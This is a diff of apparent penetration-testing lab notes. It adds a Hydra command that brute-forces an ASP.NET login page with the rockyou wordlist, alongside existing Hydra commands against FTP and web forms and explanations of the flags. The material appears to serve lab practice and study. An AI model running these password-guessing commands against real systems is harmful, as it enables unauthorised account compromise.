@@ -20,6 +20,8 @@ hydra -t 16 -l lazie -P /usr/share/wordlists/rockyou.txt -vV 10.10.71.62 ftp -s 
 
 hydra -t 16 -l molly -P /usr/share/wordlists/rockyou.txt 10.10.168.183 http-post-form "/:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.94.192 -f http-post-form "/Account/login.aspx:__VIEWSTATE=wvLZZPNbGZdcGsj2ZAdn2x76kmftfsEp4tVOzqs%2BSODIGW7%2BRAUMjBPBW93Fyx%2F4s3skKy8K9%2F7fjBaVyaWNWyEhSYepzOXUo0xPzXZPqQOLcGFiq1Yp8McXn%2BJAZc2Ja%2FD2Xk7NMhggx6JTlWBDM5LAGDBVz8OS3kRGAroPuZ%2BnHZff&__EVENTVALIDATION=SP5j67h8%2BRjMdhENTP4RJn9m4XJewgB0SRqG5JLHZc6XDcdYGfNlCIDVwZQHbWhIhioikZ%2BMMNjnK4OJvs67YVC%2FSu4R%2FaZQBEAnjHEsAZzqsWTGFalg1qJczUsa83QgruRDvgeQzc7Vyt8dnCSr2Fz9kCtBRg33iaW%2BEHZ6Kg6aR9nJ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed"
+
 
 -t 4 suggests the number of parallel connections
 -l [user] Points to the user whose account you are trying to compromise
